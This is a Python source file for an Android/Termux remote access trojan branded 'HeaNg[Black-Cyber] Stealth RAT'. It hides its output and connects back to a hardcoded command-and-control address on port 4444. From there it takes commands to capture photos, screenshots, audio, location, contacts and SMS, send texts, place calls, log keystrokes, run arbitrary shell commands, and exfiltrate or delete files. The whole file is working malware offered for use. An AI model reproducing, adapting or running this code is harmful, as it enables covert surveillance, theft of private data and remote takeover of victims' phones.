# main.py - HeaNg[Black-Cyber] Stealth RAT
import os, sys, time, socket, subprocess, json, base64, random
from datetime import datetime

C2_IP = "192.168.111.43"
C2_PORT = 4444

sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

class StealthRAT:
    def __init__(self):
        self.running = True
        self.conn = None
        
    def connect(self):
        while self.running:
            try:
                self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.conn.settimeout(10)
                self.conn.connect((C2_IP, C2_PORT))
                return True
            except:
                time.sleep(random.randint(5, 15))
        return False
    
    def run(self):
        if not self.connect():
            return
        while self.running:
            try:
                cmd = self.conn.recv(4096).decode().strip()
                if not cmd:
                    break
                result = self.execute(cmd)
                self.conn.send(result.encode() + b"\n")
            except:
                self.connect()
    
    def execute(self, cmd):
        parts = cmd.split(maxsplit=1)
        command = parts[0].lower()
        arg = parts[1] if len(parts) > 1 else ""
        
        if command == "info":
            return self.get_info()
        elif command == "photo":
            return self.capture_photo()
        elif command == "screenshot":
            return self.capture_screenshot()
        elif command == "location":
            return self.get_location()
        elif command == "contacts":
            return self.get_contacts()
        elif command == "sms":
            return self.get_sms()
        elif command == "send_sms":
            if arg:
                phone, msg = arg.split(" ", 1)
                return self.send_sms(phone, msg)
        elif command == "call":
            return self.make_call(arg)
        elif command == "lock":
            return self.lock_phone()
        elif command == "unlock":
            return self.unlock_phone()
        elif command == "reboot":
            return self.reboot_phone()
        elif command == "shutdown":
            return self.shutdown_phone()
        elif command == "reset":
            return self.reset_phone()
        elif command == "ls":
            return self.list_files(arg or "/sdcard")
        elif command == "download":
            return self.download_file(arg)
        elif command == "delete":
            return self.delete_file(arg)
        elif command == "exec":
            return self.exec_cmd(arg)
        elif command == "apps":
            return self.get_apps()
        elif command == "vibrate":
            return self.vibrate()
        elif command == "battery":
            return self.get_battery()
        elif command == "storage":
            return self.get_storage()
        elif command == "record":
            return self.record_audio()
        elif command == "keylog_start":
            return self.keylog_start()
        elif command == "keylog_get":
            return self.keylog_get()
        elif command == "keylog_stop":
            return self.keylog_stop()
        else:
            return f"Unknown: {command}"
    
    def get_info(self):
        try:
            info = {
                "device": subprocess.getoutput("getprop ro.product.model 2>/dev/null"),
                "android": subprocess.getoutput("getprop ro.build.version.release 2>/dev/null"),
                "host": subprocess.getoutput("uname -n 2>/dev/null"),
                "time": datetime.now().isoformat()
            }
            return json.dumps(info, indent=2)
        except:
            return "ERROR"
    
    def capture_photo(self):
        try:
            os.system("termux-camera-photo /sdcard/.cache.jpg 2>/dev/null")
            time.sleep(1)
            with open("/sdcard/.cache.jpg", "rb") as f:
                return base64.b64encode(f.read()).decode()[:300] + "..."
        except:
            return "ERROR"
    
    def capture_screenshot(self):
        try:
            os.system("termux-screenshot /sdcard/.cache.png 2>/dev/null")
            time.sleep(1)
            with open("/sdcard/.cache.png", "rb") as f:
                return base64.b64encode(f.read()).decode()[:300] + "..."
        except:
            return "ERROR"
    
    def get_location(self):
        try:
            return subprocess.getoutput("termux-location 2>/dev/null")
        except:
            return "ERROR"
    
    def get_contacts(self):
        try:
            return subprocess.getoutput("termux-contact-list 2>/dev/null")[:1500]
        except:
            return "ERROR"
    
    def get_sms(self):
        try:
            return subprocess.getoutput("termux-sms-list 2>/dev/null")[:1500]
        except:
            return "ERROR"
    
    def send_sms(self, phone, msg):
        try:
            subprocess.run(["termux-sms-send", "-n", phone, msg], timeout=5)
            return f"SMS sent to {phone}"
        except:
            return "ERROR"
    
    def make_call(self, phone):
        try:
            subprocess.run(["termux-telephony-call", phone], timeout=5)
            return f"Calling {phone}"
        except:
            return "ERROR"
    
    def lock_phone(self):
        try:
            subprocess.run(["input", "keyevent", "26"], timeout=2)
            return "Locked"
        except:
            return "ERROR"
    
    def unlock_phone(self):
        try:
            subprocess.run(["input", "swipe", "300", "1000", "300", "300"], timeout=2)
            return "Unlocked"
        except:
            return "ERROR"
    
    def reboot_phone(self):
        try:
            subprocess.run(["reboot"], timeout=2)
            return "Rebooting..."
        except:
            return "ERROR"
    
    def shutdown_phone(self):
        try:
            subprocess.run(["reboot", "-p"], timeout=2)
            return "Shutting down..."
        except:
            return "ERROR"
    
    def reset_phone(self):
        try:
            subprocess.run(["reboot", "recovery"], timeout=2)
            return "Factory resetting..."
        except:
            return "ERROR"
    
    def list_files(self, path):
        try:
            return subprocess.getoutput(f"ls -la {path} 2>/dev/null")
        except:
            return "ERROR"
    
    def download_file(self, path):
        try:
            with open(path, "rb") as f:
                return base64.b64encode(f.read()).decode()[:500] + "..."
        except:
            return "ERROR"
    
    def delete_file(self, path):
        try:
            os.remove(path)
            return f"Deleted {path}"
        except:
            return "ERROR"
    
    def exec_cmd(self, cmd):
        try:
            return subprocess.getoutput(cmd + " 2>/dev/null")
        except:
            return "ERROR"
    
    def get_apps(self):
        try:
            return subprocess.getoutput("pm list packages 2>/dev/null")[:1500]
        except:
            return "ERROR"
    
    def vibrate(self):
        try:
            subprocess.run(["termux-vibrate", "1000"], timeout=2)
            return "Vibrating..."
        except:
            return "ERROR"
    
    def get_battery(self):
        try:
            return subprocess.getoutput("termux-battery-status 2>/dev/null")
        except:
            return "ERROR"
    
    def get_storage(self):
        try:
            return subprocess.getoutput("df -h /sdcard 2>/dev/null")
        except:
            return "ERROR"
    
    def record_audio(self):
        try:
            os.system("termux-microphone-record start 2>/dev/null")
            time.sleep(10)
            os.system("termux-microphone-record stop 2>/dev/null")
            with open("/sdcard/.cache.amr", "rb") as f:
                return base64.b64encode(f.read()).decode()[:300] + "..."
        except:
            return "ERROR"
    
    def keylog_start(self):
        try:
            os.system("termux-keyboard start 2>/dev/null")
            return "Keylogger started"
        except:
            return "ERROR"
    
    def keylog_get(self):
        try:
            return subprocess.getoutput("termux-keyboard logs 2>/dev/null")[:1500]
        except:
            return "ERROR"
    
    def keylog_stop(self):
        try:
            os.system("termux-keyboard stop 2>/dev/null")
            return "Keylogger stopped"
        except:
            return "ERROR"

if __name__ == "__main__":
    rat = StealthRAT()
    rat.run()
